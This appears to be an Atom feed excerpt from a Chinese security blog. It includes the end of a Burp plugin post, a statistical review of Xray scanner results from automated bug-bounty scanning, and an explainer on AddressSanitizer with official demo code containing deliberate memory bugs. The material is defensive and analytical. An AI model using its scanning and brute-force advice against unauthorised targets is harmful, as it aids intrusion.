class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至此一个<code>burp</code>插件算是完成了。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>  在检测<code>dns</code>记录的时候遇到了一个问题，DNS数据包中<code>.</code>并不是<code>ord('.')</code>的格式</p><p><img src="https://wiki-1258274765.cos.ap-nanjing.myqcloud.com/wiki/img1667114171212.png"></p><p>  为了准确识别，采用了<code>fastjson83</code>而非<code>fastjson83.payload</code></p><h3 id="api问题"><a href="#api问题" class="headerlink" title="api问题"></a>api问题</h3><p>  目前新接口还在不断更新中，不是特别稳定。比如说文档中的<code>DnsDetails</code>会返回<code>ByteArray</code>类型<br><img src="https://wiki-1258274765.cos.ap-nanjing.myqcloud.com/wiki/img1667114430532.png"><br>  但是目前最新的<code>burp</code>接口中还是<code>byte[]</code><br><img src="https://wiki-1258274765.cos.ap-nanjing.myqcloud.com/wiki/img1667114541690.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  Burp的新版本更新了新的&lt;code&gt;API&lt;/code&gt;接口，刚好最近有写插件的想法，所以简单的了解了下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221101</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="BurpSuite" scheme="https://rainsec.cn/tags/BurpSuite/"/>
    
  </entry>
  
  <entry>
    <title>对Xray 5.6W条结果的简单分析</title>
    <link href="https://rainsec.cn/post/Xray%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90.html"/>
    <id>https://rainsec.cn/post/Xray%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90.html</id>
    <published>2022-10-12T11:48:45.000Z</published>
    <updated>2023-04-12T02:36:51.351Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对Xray-5-6W条结果的简单分析"><a href="#对Xray-5-6W条结果的简单分析" class="headerlink" title="对Xray 5.6W条结果的简单分析"></a>对Xray 5.6W条结果的简单分析</h1><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221012/image-20221009230905837.2jiiuh6lk5s0.png"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自动化扫描src已经做一段时间了，各类问题累计扫出来7.3w+，其中xray作为扫描漏洞的主力之一，上报了5.6w+问题 。目前应该是全网使用xray漏洞记录最多的一个了吧。</p><p>这里便根据这5.6w+扫描结果来对xray做一个简单的分析及复盘，先说下我目前使用方式:</p><p><strong>扫描目标</strong></p><ul><li>各大国内src相关资产</li></ul><p><strong>扫描方式</strong></p><ul><li>crawlgergo爬取网站请求并发送到xray</li><li>xray扫描爬取的网站请求将结果发送给webhook</li><li>webhook收集并报告漏洞</li></ul><p>简单来说就是: crawlgergo—-&gt;xray—-&gt;webhook</p><p><strong>开局套个盾</strong></p><ul><li>统计结果仅包含src的资产，一般有src厂商的网站安全性要比普通厂商的安全性要高出很多，不同src对应厂商的安全性也不相同，分析结果仅供娱乐，不代表某个具体公司，亦不代表整体情况。</li><li>随着扫描结果越来越多，后续根据我的扫描习惯关闭了一些误报过高和没有太大利用价值的插件，所以对于对于一些插件的统计结果是偏低的。</li><li>本次取的是xray直接的报告结果，其中包含了xray的误报。</li></ul><h2 id="正片"><a href="#正片" class="headerlink" title="正片"></a>正片</h2><p>本次统计漏洞总数为56666，这里将漏洞分为xray内置插件扫描和加载yaml插件扫描两类，其中</p><ul><li>内置插件漏洞数量：54507</li><li>yaml插件漏洞数量：2159</li></ul><h3 id="xray自带插件分析"><a href="#xray自带插件分析" class="headerlink" title="xray自带插件分析"></a>xray自带插件分析</h3><p>xray自带插件可以分为10个大类</p><ul><li>dirscan</li><li>baseline</li><li>xss</li><li>redirect</li><li>brute-force</li><li>sqldet</li><li>jsonp</li><li>path-traversal</li><li>cmd-injection</li><li>crlf-injection</li></ul><p>细分总计有60个小类（ps:实际不止60，这里取的是报告结果统计出来的分类），具体如下</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221012/image-20221009230921064.2kjckdgpmdk0.png"></p><h4 id="对整体漏洞统计如下"><a href="#对整体漏洞统计如下" class="headerlink" title="对整体漏洞统计如下"></a>对整体漏洞统计如下</h4><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221012/image-20221009230929980.13eoorebzubk.png"></p><p>dirscan和baseline远高于其他插件，下面具体说说各类漏洞的情况及使用体验</p><h4 id="baseline"><a href="#baseline" class="headerlink" title="baseline"></a>baseline</h4><p>baseline下面具体说说各类漏洞的情况及使用体验</p><ul><li>baseline/cors/allow-https-downgrade/cors/allow-https-downgrade/cors/allow-https-downgrade</li><li>baseline/cors/allow-null-with-credential</li><li>baseline/cors/any-origin-with-credential</li><li>baseline/cors/reflected</li><li>baseline/sensitive/server-error</li></ul><p>其中server-error最多，达到20711条。baseline对自动化挖src来说，没有太多价值，为了减少干扰，后来直接在配置文件关掉这个大类检测，所以这块的实际统计是偏少的。</p><h4 id="dirscan"><a href="#dirscan" class="headerlink" title="dirscan"></a>dirscan</h4><p>感觉xray花了大量精力来做这个插件，直接分了45个小类，漏洞种类它占了三分之一</p><p>由于分的太细，有些漏洞名字完全不知道干嘛的，这里根据具体的报告做了个简单的记录</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221012/image-20221009230937872.5qfhlala10o0.png"></p><p>导致dirscan数量偏高的主要是以下4个插件，总计22971个。</p><ul><li>dirscan/debug/readme</li><li>dirscan/sourcemap/default</li><li>dirscan/sensitive/crossdomain</li><li>dirscan/directory/default</li></ul><p>第一个第三个价值不大</p><p>第二个是js.map泄漏，第四个是目录遍历，由于xray没做相关去重，一个网站有问题，那么连带着可能报上来几十甚至上百条报告。</p><p>仔细梳理下来，dirscan细分了很多类，其实有些是相似的，可以合并到一起，分成两级其实更简洁明了。</p><p>diarscan中实际可直接利用的并不多，可以把其中的一些高价值或命中高价值关键字的漏洞做一些醒目的提醒，减少干扰。比如目录遍历的文件可进一步读取。泄漏密码或者其他重要配置。</p><p>部分插件可以做进一步扫描的，比如发现phpmyadmin和tomcat可以尝试爆破。</p><p>git/svn插件误报有点多。</p><h4 id="sqldet"><a href="#sqldet" class="headerlink" title="sqldet"></a>sqldet</h4><p>sql注入检测插件</p><ul><li>sqldet/blind-based/default</li><li>sqldet/error-based/default</li><li>sqldet/time-based/default</li></ul><p>报错注入，bool盲注，时间盲注都有检测。</p><p>实际使用中扫出来过报错注入，在本地扫描的时候扫出来过被我漏掉的时间盲注。</p><p>但是bool盲注，时间盲注在这套自动化测试流程中全是误报，而且误报特别多，后来直接关闭这俩检测，只保留了报错注入。</p><h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>基于语义化检测的检测逻辑，检测过程无明显流量特征，对于有防护的场景依然有很高的准确度。</p><p>最开始的时候手工验证了很多报告，很多防御不严谨的都被识别出来了，基本上绕一下就能触发xss，算得上扫xss神器。</p><p>可惜是国内的xss，还是反射型xss，有的还有条件限制。即时交了给的赏金还不够写报告的手工费。后来扫出来的越来越多，也懒得挨个看了，现在默认忽略xss漏洞。</p><h4 id="redirect"><a href="#redirect" class="headerlink" title="redirect"></a>redirect</h4><p>检测payload设计的挺巧妙的，payload自带绕过能力，精确度也挺高。</p><p>可惜不值钱，也被我当做默认忽略的漏洞之一了。</p><h4 id="brute-force"><a href="#brute-force" class="headerlink" title="brute-force"></a>brute-force</h4><ul><li>brute-force/basic-auth/default</li><li>brute-force/form-brute/default</li></ul><p>这个模块，基本都是误报= =.</p><p>basic-auth报告3个全是误报，form-brute报告378条具体正确多少个忘记了，但不超过5个，这个插件怎么说呢，关掉吧，万一命中一个说不准就是个高危漏洞，不关吧，命中率实在感人，自己写一个吧，不经过大量测试写出来的命中率估计还不如这个呢。。</p><h4 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h4><p>扫出来的结果并不多，且利用价值都不高。纯依靠插件来检测这类漏洞中高价值的还是有点难度的。</p><h4 id="cmd-injection、crlf-injection、path-traversal"><a href="#cmd-injection、crlf-injection、path-traversal" class="headerlink" title="cmd-injection、crlf-injection、path-traversal"></a>cmd-injection、crlf-injection、path-traversal</h4><p>这三个的报告很少，而且报上来的也是全是误报。</p><h3 id="xray加载的yaml插件分析"><a href="#xray加载的yaml插件分析" class="headerlink" title="xray加载的yaml插件分析"></a>xray加载的yaml插件分析</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>在写这篇文章前的印象是除了两三个特别容易误报的插件外，其他插件相对较好的。然而在写这篇文章的时候重新整理了一下这些结果，发现这里面的误报真的多，很多插件直接全是误报。。。这里直接不展开分析了。</p></blockquote><p>简单说一下结果：</p><p>yaml插件总计352个，有报告漏洞的插件共36个。</p><p>将插件根据发现漏洞数量排序，原本想挑几个效果比较好的插件分析下的，结果发现好多插件插件误报率百分百，一直找到第20个才凑齐10个，直接放弃。（ps:这里说的是误报不是漏报，造成原因是目前扫描的目标里面没有这些漏洞。）</p><p>这里放个排除掉误报比较高的插件后的前十插件占比。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221012/image-20221009230953068.1gp4el8ndfkw.png"></p><p>yaml插件估计是官方在审核插件的时候只是审核插件是否会漏报，并没有进行大范围的测试。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最后简单总结下在这段时间使用下来后对于xray的评价</p><p>先说优势</p><ul><li>在基础普通漏洞验证上做的相对完善。部分类型的漏洞验证方式及思路非常巧妙。</li><li>支持额外加载yaml插件来补充其对1day漏洞的扫描能力</li><li>有官方运营的社区，可不断补充1day插件</li></ul><p>然后缺点</p><ul><li>编译型语言的导致的硬伤，不如脚本语言灵活。只能通过解析yaml文件来进行poc编写，但yaml在应对复杂场景的检测局限性很大。</li><li>针对新的影响范围较广的漏洞等的补充只能等待官方更新，比如log4j到目前都没有支持。</li><li>不支持被动扫描插件编写。</li><li>用于大范围扫描时很多插件误报严重。</li></ul><p>在最初了解到基于流量的被动扫描时就感觉这是个很好的漏洞扫描思路，能做的事情应该远高于传统扫描器。</p><p>xray作为最火的被动扫描，在长时间使用下来的体验是相比传统扫描器有一定特色，除具备传统扫描器功能外，也有一定的灵活性。</p><p>但由于其不开源，开放出来的版本本质还是基于传统漏洞和僵硬的1day扫描，无法完成被动扫描插件的开发，没有将被动扫描真正的灵活性完全的体现出来。想要完全发挥被动扫描的能力仍然需要配合其他的被动扫描工具。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;对Xray-5-6W条结果的简单分析&quot;&gt;&lt;a href=&quot;#对Xray-5-6W条结果的简单分析&quot; class=&quot;headerlink&quot; title=&quot;对Xray 5.6W条结果的简单分析&quot;&gt;&lt;/a&gt;对Xray 5.6W条结果的简单分析&lt;/h1&gt;&lt;p&gt;&lt;img s</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>AddressSanitizer 漏洞检测技术剖析</title>
    <link href="https://rainsec.cn/post/AddressSanitizer.html"/>
    <id>https://rainsec.cn/post/AddressSanitizer.html</id>
    <published>2022-10-08T07:07:45.000Z</published>
    <updated>2023-04-12T02:36:51.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AddressSanitizer-漏洞检测技术剖析"><a href="#AddressSanitizer-漏洞检测技术剖析" class="headerlink" title="AddressSanitizer 漏洞检测技术剖析"></a>AddressSanitizer 漏洞检测技术剖析</h1><p>  类似AFL之类的Fuzzing技术不断强大的一个核心原因就是漏洞检测能力的不断增强，作为AFL这款经典工具的核心，ASAN的漏洞检测核心能力值得关注。</p><h2 id="ASAN简介"><a href="#ASAN简介" class="headerlink" title="ASAN简介"></a>ASAN简介</h2><p>  ASAN其实本身是作为LLVM项目的一部分存在于Clang里面，其作用就是一个强大的内存错误检测器，它由一个编译插桩模块和一个运行时库组成，据官网介绍其可以检测以下类型的漏洞：</p><ol><li>Out-of-bounds accesses to heap, stack and globals.</li><li>Use-after-free</li><li>Use-after-return</li><li>Use-after-scpe</li><li>Double-free, invalid free</li><li>Memory leaks (experimental)</li><li>initialization order checking</li></ol><p>  ASAN的使用方法非常简单，在进行clang编译的时候加上-fsanitize=address参数，这样ASAN的run time library就会被链接到可执行文件里面，但是ASAN并不支持对于共享库的链接。显而易见的是使用ASAN会导致性能降低，因此需要配合clang的一些优化参数，关于这一部分本文只做简单的使用示范不追究其原理，因为作者在性能优化这块就是个彩笔。<br>ASAN官方Demo：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int main(int argc, char **argv) {  int *array = new int[100];  delete [] array;  return array[argc];  // BOOM}// clang++ -O1 -g -fsanitize=address -fno-omit-frame-pointer example_UseAfterFree.cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果ASAN检测到一个bug之后就会把相关的信息打印出来，同时ASAN也会直接退出，这是因为：</p><ol><li>这使得ASAN在编译插桩阶段产生更小更快的代码。</li><li>一旦产生内存异常，程序就会进入inconsistent state（大致意思就是跟原来程序员预想的状态不同），这就会导致如果不终止ASAN就可能其在接下来的运行中产生误报。</li></ol><p>这就是ASAN的基本用法了，关于使用可以看参考链接。</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>以下漏洞检测中，如果是简单常用的漏洞类型就不针对漏洞原理进行介绍，可以自行查找资料。</p></blockquote><h2 id="ASAN算法"><a href="#ASAN算法" class="headerlink" title="ASAN算法"></a>ASAN算法</h2><p>  ASAN主要是检测内存，所以其算法也主要是对内存操作，因此对于ASAN来说，其第一步要做的就是接管目标的内存管理。ASAN的具体做法是通过runtime library替代原有的malloc和free，同时将malloc分配的内存周围的区域标记为red-zones（red-zones内存状态被称为为（poisoned）中毒状态），同时将free掉的内存单独隔离并标记为中毒状态，并且每一次程序访问内存的操作都会被修改为如下：<br>编译前：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">*address = ...;  // or: ... = *address;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译后：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (IsPoisoned(address)) {  ReportError(address, kAccessSize, kIsWrite);}*address = ...;  // or: ... = *address;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>那么此时会存在一些问题：</p><ul><li>如何快速实现IsPoisoned？</li><li>如何更好的输出错误？</li><li>所有的内存访问都应该被检查吗？（本文核心关注点）</li></ul><p>ASAN官方专门回答了第三个问题，根据官方的解释，ASAN不应该插桩所有的内存访问，因为在程序的运行过程当中需要大量访问相同位置的内存，如下：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void inc(int *a) {  (*a)++;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时同时存在对同一个地址的访问和存储操作，事实上对于内存访问错误，只用检测其中的一次操作就够了，而像下面的代码逻辑：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (...)  *a = ...*a = ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">*a = ...if (...)  *a = ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  其实都是只用检测一次内存访问就够了，还有循环之类的操作，其实没必要对循环内的每一次内存访问全部都插桩处理，还有很多其它的优化情况比如变量的数据流传递过程中，没必要对未发生实际变量内存地址改变的情况下对每次一关于该变量的内存访问都做检查，又或者对于全局常量的内存访问检查很可能是没有意义的。根据官方解释，这些优化目前还没有完全应用到ASAN，有兴趣的可以自行探索一下。</p><p>简单说一下ASAN的优化思路之后回到其内存管理，ASAN会将全部的虚拟内存分为两大部分：</p><ol><li>Main application memory：这块内存主要用于程序常规的内存分配。</li><li>Shadow memory：该内存区域保存着一些元数据，假如Main mem里面的某一个bit的数据被标记为中毒状态，那么在对应的Shadow memory里面都有所记录。</li></ol><p>这两种内存相互配合，因此一旦Main mem里面有内存被标记，那么对应的Shadow memory应该被快速计算出来。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">shadow_address = MemToShadow(address);if (ShadowIsPoisoned(shadow_address)) {  ReportError(address, kAccessSize, kIsWrite);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>上面代码的意思应该是不允许存在多次中毒标记同一地址。</p><p>Main mem和Shadow memory之间的映射关系是8字节的Main mem对应1字节的Shadow memory，这一点应该很好理解，存在这样一种机制的核心作用还是确定那些内存是可访问的，那些内存是不可访问的，关于具体的映射细节可以看<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerAlgorithm#mapping">这里</a>，非常简单。</p><p>接下来介绍，ASAN是如何报告错误的。</p><ul><li>复制内存异常地址到rax(eax)</li><li>execute ud2 (generates SIGILL) SIGILL是一个signal信号，当处理器遇到非法指令的时候就会发出该信号。该信号中断进程并进行core dump。</li></ul><p>  用一个字节编码异常地址访问类型和大小，全部的三个步骤大概需要5-6字节的机器码。<br>通过上述内容已经基本了解堆内存的管理办法，那么栈内存该如何处理呢？<br>Demo：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void foo() {  char a[8];  ...  return;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译插桩后：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void foo() {  char redzone1[32];  // 32-byte aligned  char a[8];          // 32-byte aligned  char redzone2[24];  char redzone3[32];  // 32-byte aligned  int  *shadow_base = MemToShadow(redzone1);  shadow_base[0] = 0xffffffff;  // poison redzone1  shadow_base[1] = 0xffffff00;  // poison redzone2, unpoison 'a'  shadow_base[2] = 0xffffffff;  // poison redzone3  ...  shadow_base[0] = shadow_base[1] = shadow_base[2] = 0; // unpoison all  return;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  其处理办法也是类似的，将程序中分配的栈空间周围内存进行标记来观察接下来的代码访问过程中是否会存在内存越界操作。<br>  在整个漏洞检测中除了内存监控算法之外，还有一个比较重要的就是call stack算法，关于call stack，ASAN主要收集以下三个事件相关的stack：</p><ol><li>malloc and free</li><li>Thread create</li><li>Failure</li></ol><p> 对于ASAN来说，其收集stack trace相关的信息是利用了LLVM项目里面的另一个工具llvm-symbolizer，llvm-symboilzer的作用是从命令行接收目标文件名和地址，然后打印地址对应的源码位置到标准输出。ASAN利用llvm-symboilzer可以将地址全部符号化，从而实现对stack trace的符号化记录，因此在report error的时候就可以看到更多详细信息。</p><p>到此关于ASAN中内存相关的基础算法介绍结束，下面主要剖析具体漏洞类型的检测。</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>  通过对上述算法的了解我们就能知道OOB的检测来源于ASAN中的red zones算法。</p><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>  其实在上面的基本算法介绍完了之后就应该明白其UAF的检测原理，每一次的free之后，ASAN并不会直接释放内存，而是对其进行标记和隔离，那么下一次对释放内存进行访问时就可以被监视到，然后输出错误报告。</p><h3 id="UAR"><a href="#UAR" class="headerlink" title="UAR"></a>UAR</h3><p>  默认条件下ASAN并不检测这个bug，这种类型的漏洞其实也很少被提及，可能是利用条件比较苛刻的原因（个人猜测），可以看下官方demo：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">// RUN: clang -O -g -fsanitize=address %t &amp;&amp; ./a.out// By default, AddressSanitizer does not try to detect// stack-use-after-return bugs.// It may still find such bugs occasionally// and report them as a hard-to-explain stack-buffer-overflow.// You need to run the test with ASAN_OPTIONS=detect_stack_use_after_return=1int *ptr;__attribute__((noinline))void FunctionThatEscapesLocalObject() {  int local[100];  ptr = &amp;local[0];}int main(int argc, char **argv) {  FunctionThatEscapesLocalObject();  return ptr[argc];}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  对于这种漏洞的检测，ASAN其实采用的也是类似heap uaf的做法，但是在具体的实现方法上存在的差别还是很大的。对于栈帧比较了解的人应该清楚，一旦一个函数return，那么它的栈就会被回收然后在下一次栈分配的时候被重复利用，如此来看通过red-zones类似的方法显然是行不通的，ASAN的做法是将栈迁移到堆上：<br>未迁移前：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void foo() {  int local;  escape_addr(&amp;local);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>迁移后：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void foo() {  char redzone1[32];  int local;  char redzone2[32+28];  char *fake_stack = __asan_stack_malloc(&amp;local, 96);  poison_redzones(fake_stack);  // Done by the inlined instrumentation code.  escape_addr(fake_stack + 32);  __asan_stack_free(stack, &amp;local, 96)}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  __asan_stack_malloc(real_stack, frame_size)函数会从fake stack（ASAN实现的一个thread-local heap-like structure）分配一个大小为framz_size的fake frame，所有的fake frame都来自未被标记为中毒状态的内存，但是如果被使用（如上demo）就会被poison_redzones标记。__asan_stack_free(fake_stack, real_stack, frame_size)函数则会将所有的fake frame标记为中毒状态并进行释放。那么如果存在UAR的时候会因访问被标记为中毒的内存而被检测出异常。<br>  从上面可以看出这种检测方法还是挺消耗内存的，fake stack 分配器会为每个线程分配固定大小的内存，大小从2的6次方到2的16次方字节不等，每个线程对应的内存也会被分成一定数量的chunk，如果chunk被用完，那么接下来的栈分配就会使用程序原本的stack，此时的UAR检测也会实效，因此越好的检测效果就代表越高的内存消耗。</p><h3 id="UAS"><a href="#UAS" class="headerlink" title="UAS"></a>UAS</h3><p>UAS同样知名度不高，先看官方Demo：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">// RUN: clang -O -g -fsanitize=address -fsanitize-address-use-after-scope \//    use-after-scope.cpp -o /tmp/use-after-scope// RUN: /tmp/use-after-scope// Check can be disabled in run-time:// RUN: ASAN_OPTIONS=detect_stack_use_after_scope=0 /tmp/use-after-scopevolatile int *p = 0;int main() {  {    int x = 0;    p = &amp;x;  }  *p = 5;  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  大致意思就是作用域内定义的变量在作用域外被访问，ASAN检测这种漏洞的办法是随着程序的执行流不断的标记被局部变量使用的内存，当执行流到达一个作用域的时候，相关局部变量的内存被标记为good，当执行流到达一个作用域的结尾时，相关内存被标记为bad，看下面的demo：<br>编译前：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void f() {  int *p;  if (b) {    int x[10];    p = x;  }  *p = 1;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译后：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void f() {  int *p;  if (b) {    __asan_unpoison_stack_memory(x);    int x[10];    p = x;    __asan_poison_stack_memory(x);  }  *p = 1;   __asan_unpoison_stack_memory(frame);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为栈是会被复用的，所以在函数return之前必须将相关内存取消中毒标记。</p><h3 id="Double-free-and-invalid-free"><a href="#Double-free-and-invalid-free" class="headerlink" title="Double free and invalid free"></a>Double free and invalid free</h3><p>参考UAF。</p><h3 id="Memory-leaks-experimental"><a href="#Memory-leaks-experimental" class="headerlink" title="Memory leaks (experimental)"></a>Memory leaks (experimental)</h3><p>  试验级别的先不说，ASAN专门集成了LeakSanitizer来研究这类漏洞的检测，可以参考<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerLeakSanitizer">这里</a>。</p><h3 id="initialization-order-checking"><a href="#initialization-order-checking" class="headerlink" title="initialization order checking"></a>initialization order checking</h3><p>Static initialization order fiasco，这在C++程序静态全局变量初始化过程中很常见。但是这种漏洞其实比较难以检测，因为C++静态全局变量的初始化出现在Main函数执行之前。至于漏洞模型，其实也很简单，假设在A.cpp和B.cpp里面分别存在两个全局静态类C和D，假设D在初始化过程中依赖C中的某些方法但是D初始化在C之前，那么就可能会导致crash。<br>官方demo：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">$ cat tmp/init-order/example/a.cc#include &lt;stdio.h&gt;extern int extern_global;int __attribute__((noinline)) read_extern_global() {  return extern_global;}int x = read_extern_global() + 1;int main() {  printf("%d\n", x);  return 0;}$ cat tmp/init-order/example/b.ccint foo() { return 42; }int extern_global = foo();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>官方demo表明假如foo先初始化，那么就会输出43，否则就会输出1，间接表明了初始化顺序可能导致的一些安全问题。<br>ASAN对于这里漏洞的扫描默认是关闭的，可以参考<a href="https://github.com/google/sanitizers/wiki/AddressSanitizerFlags">这里</a>开启，它的检测方式分为很多种：</p><h3 id="Loose-init-order-checking"><a href="#Loose-init-order-checking" class="headerlink" title="Loose init-order checking"></a>Loose init-order checking</h3><p>  